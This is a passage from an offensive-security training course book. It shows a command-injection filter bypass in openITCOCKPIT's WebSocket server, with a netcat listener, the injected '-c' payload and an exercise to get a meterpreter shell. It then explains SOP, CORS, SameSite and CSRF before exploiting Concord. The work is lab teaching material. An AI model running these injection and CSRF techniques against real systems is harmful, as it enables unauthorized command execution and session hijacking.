User-Agent: check_http/v2.1.1 (monitoring-plugins 2.1.1) 
Connection: close 
Host: string2":8080 
"string1 
Listing 442 - Interesting connection back with double quote 
We notice that the first quote is escaped and sent and the second part of the header is included in 
the Host header. That is not what we were expecting. Now let’s try using a single quote (making 
the argument -k ‘string1 string2’). 
kali@kali:~$ nc -nvlp 8080 
listening on [any] 8080 ... 
connect to [192.168.119.120] from (UNKNOWN) [192.168.121.129] 34578 
GET / HTTP/1.0 
User-Agent: check_http/v2.1.1 (monitoring-plugins 2.1.1) 
Connection: close 
string1 
Listing 443 - Viewing connection back with single quote 
Sending a single quote returned just a single “string1” header but without any quotes. 
To recap, sending a string with double quotes escapes the double quote and the value after the 
space is treated as a parameter to the Host header. When we send a single quote, the quote is 
not escaped and the second string is not included at all. An inconsistency of this type generally 
suggests that we are injecting an unexpected character. If that is the case, when using a single 
quote we might be injecting “string2” as another command. 
To test this theory, we will replace “string2” with “–help”. If we get the help message of 
check_http, we know that we are not injecting into another command and that we have instead 
discovered a strange bug. However, if we receive no help message or a help message from a 
different command, we know that we might have discovered an escape. 
kali@kali:~/scripts$ python3 wsclient.py --url wss://openitcockpit/sudo_server -k 
1fea123e07f730f76e661bced33a94152378611e 
[+] Connected! 
./check_http -I 192.168.119.120 -p 8080 -k 'string1 --help'      
Usage: su [options] [LOGIN] 
 
Options: 
  -c, --command COMMAND         pass COMMAND to the invoked shell 
  -h, --help                    display this help message and exit 
  -, -l, --login                make the shell a login shell 
  -m, -p, 
  --preserve-environment        do not reset environment variables, and 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
389 
                                keep the same shell 
  -s, --shell SHELL             use SHELL instead of the default in passwd 
Listing 444 - Injecting help argument 
The output reveals the help output from the su command. Excellent! 
Let’s pause here and try to analyze what might be going on. The WebSocket connection takes 
input that is expected to be executed. However, the developers did not want to allow users to run 
arbitrary commands. Instead, they whitelisted only certain commands (the ls command and the 
commands in the current directory). Given the output when we appended “–help”, we can also 
assume that they wanted to run the commands as a certain user, so they used su to accomplish 
that. We can speculate that the command looks something like this: 
su someuser -c './check_http -I 192.168.119.120 -p 8080 -k 'test --help'' 
Listing 445 - Command speculation 
Given that a single quote allows us to escape the command the developers expected us to run, 
we can reasonably assume a single quote is what encapsulates the user-provided data. We can 
also reasonably assume that this data is passed into the -c (short for “command”) flag in su, 
which will be executed by the username provided to su. By appending a single quote, we can 
escape the encapsulation and directly inject into the su command. 
Since we suspect that the developers are using -c to pass in the command we are attempting to 
run, what will happen if we pass in another -c? 
kali@kali:~/scripts$ python3 wsclient.py --url wss://openitcockpit/sudo_server -k 
1fea123e07f730f76e661bced33a94152378611e 
[+] Connected! 
./check_http -I 192.168.119.120 -p 8080 -k 'test -c 'echo 'hacked' 
hacked 
Listing 446 - Injecting echo command 
In this output, the second -c argument was executed instead of the first. We can now run any 
command we desire. In order to simplify exploitation, we can make modifications to our client 
script to run code and bypass the filters. 
10.7.6.1 Exercises 
1. 
Modify the wsclient.py script to run commands via the filter bypass. 
2. 
Obtain a meterpreter shell. 
10.7.6.2 Extra Mile 
Find a readable database configuration and read the password. The user we exploited in the XSS 
was not an administrator of the application. Use the database password to elevate privileges of 
the “viewer” user to the administrator and reset the password to allow you to login. The 
openITCOCKPIT application allows administrative users to create custom commands. Using this 
feature and an administrator’s account, find and “exploit” this feature. 
10.8 Wrapping Up 
In this module, we set the foundation for black box testing. We discovered a cross-site scripting 
vulnerability that we used to scrape the content of an authenticated user’s page. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
390 
With the scraped content, we discovered a WebSocket server and key that allowed users to run a 
very specific set of commands. We used fuzzing techniques to discover what was and wasn’t 
allowed and with careful review of the input and output, we were able to discover an exploit that 
allowed us to run arbitrary system commands. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
391 
10.8.1.1.1 
 
11 Concord Authentication Bypass to RCE 
Given the complexity of modern web applications, modern development teams rely on automated 
deployment practices that streamline the application build, testing, and deployment process. In 
this type of environment, workflow servers (also known as continuous deployment servers222 or 
orchestration hubs) automate the development workflow, execute the necessary build or 
deployment commands, and call the various required APIs. This practice enhances the speed, 
agility and accuracy of the deployment process. 
However, since the workflow servers at the heart of this environment must be granted access to 
code in the Dev, QA, and Production environments, they are prime targets for attack. 
In this module, we will target the open-source Concord workflow server, which was developed by 
WalMart. As we will discover, Concord suffers from three authentication bypass vulnerabilities. 
The first vulnerability was discovered by Rob Fitzpatrick, who discovered an information 
disclosure vulnerability associated with a permissive Cross-Origin Resources Sharing (CORS) 
header. The second vulnerability is a Cross-site Request Forgery (CSRF) vulnerability that was 
discovered by Offensive Security. The third vulnerability (also discovered by Offensive Security) 
leverages default user accounts that can be accessed with undocumented API keys. 
We will review all three vulnerabilities in this module, beginning with the CORS vulnerability. We’ll 
start with a greybox approach in which we have access to the documentation, but we won’t 
review the source code. As we search for a viable exploit vector, we will uncover the CSRF and 
leverage these vulnerabilities into remote code execution (RCE). 
Finally, we will review the source code (adopting a whitebox approach) to uncover the default user 
vulnerability, which we will again leverage into RCE. 
11.1 Getting Started 
Let’s begin by exploring the target application. As we navigate the application we will refer to 
various sections of the documentation.223 
In order to access the Concord server, we have created a hosts file entry named “concord” on our 
Kali Linux VM. Make this change with the corresponding IP address on your Kali machine to 
follow along. Be sure to revert the Concord virtual machine from your student control panel 
before starting your work. The Concord box credentials are listed in the Wiki. 
The application is running on port 8001. Let’s navigate to the page with Burp Suite’s embedded 
Chromium browser. 
 
222 (Atlassian, 2021), https://www.atlassian.com/continuous-delivery/continuous-deployment 
223 (Walmart, 2021), https://concord.walmartlabs.com/docs/index.html 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
392 
 
Figure 279: Concord Home Page 
The home page immediately prompts for a username and password. Other than the Login button, 
there are no other obvious links on this page. Let’s attempt to discover additional routes and files 
with a default dirb scan. 
kali@kali:~$ dirb http://concord:8001 
 
----------------- 
DIRB v2.22     
By The Dark Raver 
----------------- 
 
START_TIME: Thu Apr  1 16:15:44 2021 
URL_BASE: http://concord:8001/ 
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt 
 
----------------- 
 
GENERATED WORDS: 4612                                                           
 
---- Scanning URL: http://concord:8001/ ---- 
+ http://concord:8001/api (CODE:401|SIZE:0) 
==> DIRECTORY: http://concord:8001/docs/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
393 
+ http://concord:8001/forms (CODE:401|SIZE:0) 
==> DIRECTORY: http://concord:8001/images/ 
+ http://concord:8001/index.html (CODE:200|SIZE:2166) 
+ http://concord:8001/logs (CODE:401|SIZE:0) 
==> DIRECTORY: http://concord:8001/static/ 
 
---- Entering directory: http://concord:8001/docs/ ---- 
+ http://concord:8001/docs/index.html (CODE:200|SIZE:3589) 
 
---- Entering directory: http://concord:8001/images/ ---- 
 
---- Entering directory: http://concord:8001/static/ ---- 
==> DIRECTORY: http://concord:8001/static/css/ 
==> DIRECTORY: http://concord:8001/static/js/ 
==> DIRECTORY: http://concord:8001/static/media/ 
 
---- Entering directory: http://concord:8001/static/css/ ---- 
 
---- Entering directory: http://concord:8001/static/js/ ---- 
 
---- Entering directory: http://concord:8001/static/media/ ---- 
 
----------------- 
END_TIME: Thu Apr  1 16:56:42 2021 
DOWNLOADED: 32284 - FOUND: 5 
Listing 447 - Dirb Output 
All discovered routes except for the root of the page and the static resources (css, js, and media) 
return an Unauthorized message (401). Applications like this typically present a very small 
footprint to unauthorized users. Let’s review the HTTP history tab in Burp Suite to gain a better 
understanding of the application. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
394 
 
Figure 280: Burp History - Initial Navigation 
The initial page load initiated eight requests. The request to cfg.js loads configurations that point 
to the Concord documentation and the GitHub repository. The requests to static/js load the client-
side JavaScript. The requests to images load the logo, and the request to static/media loads the 
font. All of this is fairly standard. However, the /api/service/console/whoami API request (which 
returned an unauthorized response) is interesting. Let’s investigate further. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
395 
 
Figure 281: Request to /api/service/console/whoami 
Based on the route name, we can assume that this request would return information about the 
authenticated user. Since we are not authenticated, the response contains no user data. However, 
the headers that begin with “Access-Control” are interesting. These headers instruct the browser 
to grant specific origins access to specific resources. The mechanism that controls this is 
specified in the Cross-Origin Resource Sharing (CORS) standard.224 
Let’s discuss this potential attack vector. 
11.2 Authentication Bypass: Round One - CSRF and CORS 
When we discover a target application that serves CORS headers, we should investigate them 
since overly-permissive headers could create a vulnerability. For example, we could create a 
 
224 (WHATWG, 2021), https://fetch.spec.whatwg.org/#http-cors-protocol 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
396 
payload on a malicious website that could force a visitor to request data from the vulnerable 
website. If the victim is authenticated to the target site, our malicious site could steal the user’s 
data from the target site or run malicious requests (depending on the actual CORS settings). This 
is possible since by default, most browsers are configured to send cookies (including session 
cookies) with requests to the target site. 
By default, most browsers attempt to protect the user from such an attack in several ways. 
Nevertheless, a misconfigured site can relax these protections, making the site vulnerable to such 
an attack. 
This attack is considered a form of Cross-Site Request Forgery (CSRF)225 or session riding. During 
a CSRF attack, an attacker runs certain actions on the victim’s behalf. If the victim is 
authenticated, those actions will also be authenticated. CSRF attacks are not new. However, 
when paired with overly-permissive CORS settings, we have greater flexibility in the types of 
requests we can send and the types of data we can obtain. 
In order to properly describe CORS and CSRF attacks, we must first discuss the browser’s 
protection mechanisms. 
Unlike other headers that can increase the security of an application, CORS headers reduce the 
application’s security, relaxing the Same-origin Policy (SOP),226 which prevents cross-site 
communication. Let’s investigate this further. 
11.2.1 Same-Origin Policy (SOP) 
Browsers enforce a same-origin policy to prevent one origin from accessing resources on a 
different origin. An origin is defined as a protocol, hostname, and port number. A resource can be 
an image, html, data, json, etc. 
Without the same-origin policy, the web would be a much more dangerous place, allowing any 
website we visit to read our emails, check our bank balances, and view other information even 
from our logged-in sessions. 
Consider an example in which https://a.com/latest reaches out to multiple resources to load the 
page. Some resources might be on the same domain, but on a different page. Others might be on 
a completely different domain. Not all of these resources will successfully load. 
This table lists some of those resources, indicates whether or not they will load, and explains why: 
URL 
Result 
Reason 
https://a.com/myInfo 
Allowed Same Origin 
http://a.com/users.json 
Blocked Different Scheme and Port 
https://api.a.com/info 
Blocked Different Domain 
https://a.com:8443/files Blocked Different Port 
https://b.com/analytics 
Blocked Different Domain 
Table 2 - Investigating SOP 
 
225 (Wikipedia, 2021), https://en.wikipedia.org/wiki/Cross-site_request_forgery 
226 (Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
397 
This might seem confusing since plenty of websites have images, scripts, and other resources 
loaded from third-party origins. However, the purpose of SOP is not to prevent the request for a 
resource from being sent, but to prevent JavaScript from reading the response.227 In the example 
listed in Table 2, all of the requests would be sent, but the JavaScript on https://a.com/latest 
would not be able to read the response of those marked as “Blocked”. 
Images, iFrames, and other resources are allowed because while SOP doesn’t allow the 
JavaScript engine to access the contents of a response it does allow the resource to be loaded 
onto the page. 
This is functionally similar to the HttpOnly cookie flag, which prevents JavaScript from accessing 
the cookie, but allows the browser to send it with HTTP requests. 
Let’s use the Concord page and the Chromium JavaScript console to demonstrate this. First we’ll 
send a request to a resource on the same origin using the configuration file we found earlier at 
cfg.js. We’ll use fetch228 to send an HTTP GET request and then read the response. The 
command we’ll use is listed below. 
fetch("http://concord:8001/cfg.js") 
    .then(function (response) { 
        return response.text(); 
    }) 
    .then(function (text) { 
        console.log(text); 
    }) 
Listing 448 - Using Fetch to Send Request - cjg.js 
To run this, we’ll open the Developer Console in Chromium by pressing C+B+I and 
navigating to the Console tab. 
 
227 (Wikipedia, 2021), https://en.wikipedia.org/wiki/Same-origin_policy 
228 (Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
398 
 
Figure 282: Fetch to cfgj.s 
This request was successful and JavaScript can read the response as shown in the console log. 
Next, let’s try to access a resource on another origin using this request: 
fetch("http://example.com") 
   .then(function (response) { 
       return response.text(); 
   }) 
   .then(function (text) { 
       console.log(text); 
   }) 
Listing 449 - Using Fetch to Send Request - example.com 
We’ll again use the Console to send this request. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
399 
 
Figure 283: Fetch to example.com 
This time, the console throws an error indicating that the request was blocked. However, we can 
find the request and the response in Burp Suite. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
400 
 
Figure 284: Example.com Request and Response 
The response contains the content, but the browser prevented us (and JavaScript) from 
accessing the data. 
Given this information, it’s natural for our hacker brains to think we can bypass SOP by just 
adding an image to our site, setting the src to be the GET request we want to send, and reading 
the contents of the image. For example, let’s say we want to access an authenticated user’s 
email. We might add an image on a site we control with the url http://email.com/latestMessage. 
When the browser loads the page, it will send a request to “http://email.com/latestMessage”, load 
the user’s latest email, and place the contents in an “image”. Of course this image won’t be valid, 
since it will contain the contents of the email, but we should be able to read the contents of the 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
401 
image with JavaScript right? Wrong. Since the “image” was loaded from a different origin, the SOP 
will block JavaScript from accessing the contents. 229 
There are legitimate reasons a developer might want access to resources on a different origin. 
For example, a single page application230 (https://a.com) might want to access data via an API 
(https://api.a.com). To do this, the Cross-origin resource sharing (CORS) specification was 
introduced to allow developers to relax the same-origin policies. 
11.2.2 Cross-Origin Resource Sharing (CORS) 
In its simplest terms, CORS instructs a browser, via headers, which origins are allowed to access 
resources from the server. For example, to allow https://a.com to load data from 
https://api.a.com, the API endpoint must have a CORS header allowing the https://a.com origin. 
Let’s review these headers in an example HTTP response: 
HTTP/1.1 200 OK 
Cache-Control: no-cache 
Access-Control-Allow-Origin: https://a.com 
Access-Control-Allow-Credentials: true 
Access-Control-Expose-Headers: cache-control,content-language,expires,last-
modified,content-range,content-length,accept-ranges 
Cache-Control: no-cache 
Content-Type: application/json 
Vary: Accept-Encoding 
Connection: close 
Content-Length: 15 
 
{"status":"ok"} 
Listing 450 - Example HTTP Request 
The CORS headers start with “Access-Control”. While not all of them are necessary for cross-
origin communication, this example displays some common CORS headers.231 Let’s review each 
of these: 
• 
Access-Control-Allow-Origin: Describes which origins can access the response. 
• 
Access-Control-Allow-Credentials: Indicates if the request can include credentials (cookies) 
• 
Access-Control-Expose-Headers: Instructs the browser to expose certain headers to 
JavaScript 
The most important of these headers is the Access-Control-Allow-Origin (Listing 450), which 
specifies that the origin at https://a.com can access the resources on this host. 
As we’ve discussed, SOP does not prevent the request from being sent, but instead prevents the 
response from being read. However, there are exceptions. Some requests require an HTTP 
preflight request232 (sent with the OPTIONS method), which determines if the subsequent browser 
 
229 (PortSwigger, 2021), https://portswigger.net/web-security/cors/same-origin-policy 
230 (Wikipedia, 2021), https://en.wikipedia.org/wiki/Single-page_application 
231 (Mozilla, 2021), https://developer.mozilla3.org/en-US/docs/Web/HTTP/Headers#cors 
232 (Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Glossary/Preflight_request 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
402 
request should be allowed to be sent. Standard GET, HEAD, and POST requests don’t require 
preflight requests. However, other request methods, requests with custom HTTP headers, or 
POST requests with nonstandard content-types will require a preflight request. 
Let’s again use the JavaScript console to demonstrate this. All requests will be proxied through 
Burp Suite. 
First, we’ll start with a POST request using a standard Content-Type header. We’ll send the 
request to example.com, not bothering to log the response. 
fetch("https://example.com", 
   { 
       method: 'post', 
       headers: { 
           "Content-type": "application/x-www-form-urlencoded;" 
       } 
   }) 
Listing 451 - Using Fetch to Send a POST Request - example.com 
Once again, we’ll run this command in the Developer Console. 
 
Figure 285: POST Request with Standard Content Type 
As expected, this response was blocked by the SOP but if we review the request in Burp Suite, we 
find that the POST request was actually sent. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
403 
 
Figure 286: POST Request with Standard Content Type in Burp 
Next, let’s change the content type to a non-standard value, which is anything that is not 
“application/x-www-form-urlencoded”, “multipart/form-data”, or “text/plain”. 
fetch("https://example.com", 
   { 
       method: 'post', 
       headers: { 
           "Content-type": "application/json;" 
       } 
   }) 
Listing 452 - Using Fetch to Send a POST Request - example.com with custom Content-type 
Let’s execute this command in the Console. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
404 
 
Figure 287: POST Request with Non-Standard Content Type 
Again, the request was blocked. However, if we inspect the request, we find that it was not a 
POST. 
 
Figure 288: OPTIONS Request with Non-Standard Content Type in Burp 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
405 
11.2.2.1.1 
 
This request is the preflight OPTIONS request. In this request the client (the browser) is 
attempting to send a POST request with a custom content-type header. Since the server did not 
respond with CORS headers, the SOP blocked the request. 
Now, let’s send a request to a site that has the CORS headers set. For this, we’ll use test-
cors.appspot.com, a site designed to test CORS headers. 
fetch("https://cors-test.appspot.com/test", 
   { 
       method: 'post', 
       headers: { 
           "Content-type": "application/json;" 
       } 
   }) 
Listing 453 - Using Fetch to Send a POST Request - cors-test.appspot.com with custom Content-type 
We’ll paste this command into the Developer Console to execute it. 
 
Figure 289: POST Request with Non-Standard Content Type With CORS Response 
This time, the command didn’t throw an error. Let’s investigate the HTTP request that was sent. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
406 
 
Figure 290: OPTION Request with Non-Standard Content Type in Burp With CORS Response 
Again, the initial request was an OPTIONS request, which indicated that we are attempting to 
send a POST request with a custom content-type header. This time the response contained 
several CORS headers which allows our origin, allows our custom header, allows a POST request, 
instructs our browser to cache the CORS configuration for 0 seconds, and allows credentials 
(cookies). 
Following this preflight request, we find the actual POST request we were attempting to send. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
407 
 
Figure 291: POST Request with Non-Standard Content Type in Burp With CORS Response 
This time the actual POST request was sent through with the custom Content-Type. 
It’s important that we understand these concepts so we know what kind of requests will actually 
send data and which won’t. Our specific situation will often dictate our needs. For example, if we 
need to send requests but don’t care about receiving responses (exfiltration, etc), we have many 
options. However, if we require responses, or intend to gather data or resources from the target, 
we have fewer options since the target must send more permissive headers. 
From a security perspective, the most important headers when analyzing target applications for 
CORS vulnerabilities are Access-Control-Allow-Origin and Access-Control-Allow-Credentials. 
Access-Control-Allow-Credentials only accepts a “true” value with the default being “false”. If this 
header is set to true, any request sent will include the cookies set by the site. This means that the 
browser will automatically authenticate the request. 
The only origins allowed to read a resource are those listed in Access-Control-Allow-Origin. This 
header can be set to three values: “", an origin, or "null". If the header is set to a wildcard ("”), all 
origins are allowed to read a resource from the remote server. This might seem like the vulnerable 
configuration we are looking for, but this setting requires that Access-Control-Allow-Credentials is 
set to false, which results in all requests being unauthenticated. If the header is set to an origin 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
408 
value, only that origin is allowed to read the resource and, if Access-Control-Allow-Credentials is 
set to true, include the cookies. 
The “null” value may seem like the secure option, but it is not. Certain documents 
and files opened in the browser have a “null” origin. If the goal is to block other 
origins from sending requests to the target, removing the header is the most 
secure option. In fact, we could abuse the technique shown in this module to 
exploit a “null” value in this header. For the purposes of this module, we will not 
be analyzing the “null” origin. 
In secure circumstances, the Access-Control-Allow-Origin would only be set to trusted origins. 
This means that a malicious site we control would not be able to make HTTP requests on behalf 
of a user and read the response. 
Unfortunately, Access-Control-Allow-Origin only lets sites set a single origin. The header cannot 
contain wildcards (*.a.com) or lists (a.com, b.com, c.com). For this reason, developers found a 
creative (and insecure) solution. By dynamically setting the Access-Control-Allow-Origin header to 
the origin of the request, multiple origins can send requests with Cookies. 
We can witness this in the https://cors-test.appspot.com/test site that we interacted with earlier: 
 
Figure 292: OPTION Request with ORIGIN Header 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
409 
11.2.2.1.2 
 
The value in the Origin header is set to the origin in the browser (http://concord:8001). This header 
is automatically set by the browser for all CORS requests sent by JavaScript.233 The response 
contains this origin in the Access-Control-Allow-Origin header and allows for cookies to be sent 
with the request. This is the mechanism that instructs the CORS test site to allow requests (with 
cookies) from any origin. However, this is only useful if the target hosts sensitive data worth 
stealing or an API we could maliciously interact with. Unfortunately, our test site has neither. 
Let’s go back to the Concord application and analyze the request we found earlier. 
11.2.2.2 Exercises 
1. 
Repeat the steps above to test the various types of requests and analyze the responses. 
2. 
Find another site on the Internet that has the CORS header set to "*". Public APIs are a great 
resource for this. 
11.2.3 Discovering Unsafe CORS Headers 
Returning to the Concord application, let’s send the /api/service/console/whoami request to the 
repeater by right-clicking the request and selecting Send to Repeater. Once in Repeater, we’ll send 
the original request to review the response. 
 
Figure 293: Concord whoami Request 
This GET request to /api/service/console/whoami does not contain an Origin header. This is 
because the request is a GET to the same origin, meaning it is not a CORS request. The response 
 
233 (WHATWG, 2021), https://fetch.spec.whatwg.org/#cors-request 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
410 
contains an "Access-Control-Allow-Origin: *" header. As we’ve discussed, this indicates that the 
browser won’t send the cookies on cross-origin requests. 
If the application requires authentication, there must be some form of session management. If 
there is session management, there must be some way to send the session identifier with the 
request. 
Let’s try to add an Origin header to the request and analyze the response. 
 
Figure 294: Concord whoami Request With Origin 
Not only did the server replicate the origin into the Access-Control-Allow-Origin header, but it also 
added the Access-Control-Allow-Credentials header, setting it to true. 
However, every endpoint and HTTP method can have different CORS headers depending on the 
actions that are allowed or disallowed. Since we know that all non-standard GET and POST 
requests will send an OPTIONS request first to check if it can send the subsequent request, let’s 
change the method to OPTIONS and review the response. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
411 
 
Figure 295: Concord OPTIONS Request With Origin 
When an OPTIONS request is sent, the Origin header is not replicated to the Access-Control-Allow-
Origin header. Unfortunately, this means that the CORS vulnerability is limited. We will only be able 
to read the response of GET requests and standard POST requests. 
In order to understand what we can and cannot do with this information, we should investigate 
one more control that could prevent a browser from sending a cookie: the SameSite234 attribute. 
11.2.4 SameSite Attribute 
As we’ve already discussed, it is not difficult to instruct the user’s browser to send the request. It 
is more difficult to instruct the browser to send the request with the session cookies and gain 
access to the response. To understand the mechanics of cookies in this context, we must 
discuss the optional SameSite attribute of the Set-Cookie HTTP header. 
Let’s inspect an HTTP response to understand where we might find the SameSite attribute. 
HTTP/1.1 200 OK 
Connection: close 
Date: Thu, 01 Apr 2021 20:53:24 GMT 
Cache-Control: no-cache, no-store, must-revalidate 
Pragma: no-cache 
Expires: 0 
Content-Type: application/javascript 
Set-Cookie: session=ABCDEFGHIJKLMNO; Path=/; Max-Age=0; SameSite=Lax; 
Content-Length: 316 
 
Listing 454 - Example HTTP Response with SetCookie 
The attribute can be found anywhere in the Set-Cookie header. The attributes are separated by 
semicolons. 
 
234 (Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
412 
This attribute defines whether or not cookies are restricted to a same-site context. There are 
three possible values for this attribute: Strict, None, and Lax. 
If SameSite is set to Strict on a cookie, the browser will only send those cookies when the user is 
on the corresponding website. For example, let’s imagine a site with the domain 
funnycatpictures.com, which displays unique cat pictures to each user. The site uses cookies to 
track each user’s cats. If their cookies are set with the SameSite=Strict attribute, those cookies 
would be sent when the user visits funnycatpictures.com but would not be sent if a cat picture is 
embedded in a different site. In addition, Strict also prevents the cookies from being sent on 
navigation actions (i.e. clicking a link to funnycatpictures.com) or within loaded iframes. 
When SameSite is set to None, cookies will be sent in all contexts: when navigating, when loading 
images, and when loading iframes. The None value requires the Secure attribute,235 which ensures 
the cookie is only sent via HTTPS. 
Finally, the Lax value instructs that the cookies will be sent on some requests across different 
sites. For a cookie to be included in a request, it must meet both of the following requirements: 
1. 
It must use a method that does not facilitate a change on the server (GET, HEAD, 
OPTIONS).236 
2. 
It must originate from user-initiated navigation (also known as top-level navigation), for 
example, clicking a link will include the cookie, but requests made by images or scripts will 
not. 
SameSite is a relatively new browser feature and is not widely used. If a site does not set the 
SameSite attribute, the default implementation varies based on the type and version of the 
browser. 
As of Chrome Version 80 and Edge Version 86, Lax is the default setting for cookies that do not 
have the SameSite attribute set. At the time of this writing, Firefox and Safari have set the default 
to None. As with most other browser security features, Internet Explorer does not support 
SameSite at all. 
Back to our scenario, we should search for this attribute in the cookies sent by Concord but we 
haven’t yet received any. In many cases, an application might only set a cookie when a user is 
authenticated or when they are attempting to authenticate. Let’s attempt to log in, find the 
request in Burp Suite, and observe the response. 
 
235 (Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#attributes 
236 (Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Glossary/Safe/HTTP 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
413 
 
Figure 296: Login Request and Response 
When we submit a login request, the “whoami” request is also sent, but this time with the 
username and password Base64-encoded in the authorization header. The response contains a 
cookie. This is most likely not the session cookie but it does not have the SameSite attribute set. 
With the existence of the login page and the Access-Control-Allow-Credentials header, we can 
assume that cookies are being used for session management. Considering that roughly only 10% 
of cookies contain a SameSite attribute,237 we will assume that Concord does not set this 
attribute. 
Depending on what browser a user is using, the default fallback value might be None or Lax. 
When the default value in a browser is None, the user visiting that page might be vulnerable to 
CSRF. As we discussed earlier, when SameSite is set to None the browser will send the cookie in 
all contexts (image loads, navigation, etc.). In this situation, one site can send a request to 
 
237 (Calvano, 2020), https://dev.to/httparchive/samesite-cookies-are-you-ready-5abd 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
414 
another domain and the browser will include cookies, making CSRF possible if the victim web 
application does not implement any additional safeguards. 
Developers also have the option of mitigating CSRF vulnerabilities with the use of a CSRF token238 
which must be sent with a request that processes a state change. The CSRF token would indicate 
that a user loaded a page and submitted the request themselves. Often times, CSRF tokens are 
incorrectly configured, reused, or not rotated frequently enough. In addition, if the site is 
vulnerable to permissive CORS headers, we would be able to extract a CSRF token by requesting 
it from the page that would embed it. 
Understanding the relationship between SOP, CORS, and the SameSite attribute is critical in 
understanding how and when an application might be vulnerable to CSRF. 
In our scenario, we have learned that the Concord target has some permissive CORS headers. We 
have also not discovered any CSRF tokens. Combining this information with the state of 
SameSite, we suspect that we might be able to exploit a CSRF vulnerability. To execute CSRF, we 
must have a target user and an endpoint that allows us to extract valuable information or perform 
a privileged action. 
We’ll investigate the Concord documentation in order to determine what we can and cannot do 
with the information we have so far. 
11.2.5 Exploit Permissive CORS and CSRF 
Now that we have discussed the relationship between the various mitigating factors and have 
found that CORS headers are enabled and permissive, we can focus on exploitation. CORS 
exploits are similar to reflected Cross-Site Scripting (XSS) in that we must send a link to an 
already-authenticated user in order to exploit something of value. The difference with CORS is 
that the link we send will not be on the same domain as the site we are targeting. Since Concord 
has some permissive CORS headers, any site that an authenticated user visits can interact with 
Concord and ride the user’s session. As we discovered earlier, only GET requests and some POST 
requests will work in Concord. 
To exploit CORS, we must host our own site for the user to visit. Our site will host a JavaScript 
payload that will run in the victim’s browser and interact with Concord. In the real world, we might 
host a Concord blog with relevant Concord information to entice a victim to visit our site. 
Before we create the site, we must first find a payload that will allow us to elevate privileges or 
obtain sensitive information. Since we don’t have the ability to log in to the Concord application 
